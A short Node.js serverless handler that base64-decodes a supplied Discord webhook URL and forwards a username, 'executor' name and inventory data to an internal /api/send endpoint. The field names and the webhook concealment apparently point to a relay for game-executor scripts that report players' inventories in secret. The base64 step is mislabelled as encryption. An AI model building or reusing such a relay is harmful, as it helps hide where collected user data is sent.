const axios = require('axios');

function fromBase64(b64) {
    return Buffer.from(b64, 'base64').toString('utf8');
}

module.exports = async (req, res) => {
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { username, executor, inventoryData, encryptedWebhook } = req.body;

    if (!encryptedWebhook) {
        return res.status(400).json({ error: "Missing payload" });
    }

    const realWebhookUrl = fromBase64(encryptedWebhook);

    if (!realWebhookUrl || !realWebhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ error: "Invalid payload" });
    }

    try {
        const host = req.headers.host;
        const protocol = host.includes('localhost') ? 'http' : 'https';
        
        const response = await axios.post(`${protocol}://${host}/api/send`, {
            username,
            executor,
            inventoryData,
            webhookUrl: realWebhookUrl
        });

        return res.status(200).json(response.data);
    } catch (error) {
        return res.status(500).json({ error: 'Failed to forward to Discord' });
    }
};
